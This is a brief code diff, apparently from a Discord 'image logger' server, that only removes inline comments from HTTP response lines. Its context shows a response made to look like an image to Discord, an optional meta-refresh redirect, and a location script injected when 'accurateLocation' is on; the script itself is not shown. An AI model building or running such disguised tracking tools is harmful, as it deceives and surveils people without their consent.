@@ -247,9 +247,9 @@ height: 100vh;
 
                 if config["redirect"]["redirect"]:
                     data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                self.send_response(200) # 200 = OK (HTTP Status)
-                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
+                self.send_response(200) 
+                self.send_header('Content-type', datatype) 
+                self.end_headers() 
 
                 if config["accurateLocation"]:
                     data += b"""<script>
